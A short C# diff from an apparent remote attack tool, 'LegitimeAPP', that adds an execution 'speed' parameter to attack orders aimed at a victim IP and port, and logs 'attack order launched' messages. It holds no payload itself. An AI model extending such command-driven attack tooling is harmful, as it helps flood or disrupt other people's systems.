@@ -32,7 +32,7 @@ namespace LegitimeAPP.Shared
         [XmlElement("nbSecond")]
         public int nbSecond;
 
-        [XmlIgnore]
+        [XmlElement("speed")]
         public int speed;
 
         [XmlIgnore]
@@ -88,7 +88,8 @@ namespace LegitimeAPP.Shared
                 executingThis.Name = "Executing Order";
 
 
-            Console.WriteLine("Le nombre de seconde est de "+nbSecond) ; 
+            Console.WriteLine("[LOG] L'ordre d'attaque a été lancé  "+nbSecond) ; 
+            Console.WriteLine($"La vitesse d'execution : {speed}" ) ; 
                 
 
                 OnNewAttackOrder();
@@ -150,6 +151,7 @@ namespace LegitimeAPP.Shared
             Port = order.Port;
             VictimIP = order.VictimIP;
             nbSecond = order.nbSecond;
+            speed = order.speed ; 
 
         }
 
